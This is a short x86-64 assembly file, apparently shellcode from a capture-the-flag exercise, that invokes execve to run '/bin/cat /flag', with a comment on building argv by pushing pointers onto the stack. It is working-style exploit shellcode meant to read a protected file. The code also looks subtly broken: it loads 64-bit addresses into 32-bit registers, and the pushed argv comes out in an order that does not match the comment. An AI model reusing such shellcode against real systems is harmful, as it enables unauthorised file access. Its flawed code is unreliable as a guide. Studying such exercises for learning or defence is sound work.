        .intel_syntax noprefix
        .global _start
        .text

_start:
        
	mov     eax, 59
        lea     edi, [rip+arg0]
	mov	ecx, 0
	push	rcx

	lea 	ecx, [rip+arg1]
	push 	rcx

	lea 	ecx, [rip+arg0]
	push 	rcx

	push	rsp
	pop	rsi
//	mov 	rsi, rsp
        mov     edx, 0
        syscall
        pop rcx
	pop rcx
	pop rcx

arg0: .ascii "/bin/cat\0"
arg1: .ascii "/flag\0"
/*
	argv: .quad arg0, arg1, 0

	instead of creating that array of pointers,
	im pushing the pointers onto the stack in reverse order.

	0,
	arg0,
	arg1.

	then providing rsi with the stack pointer
*/
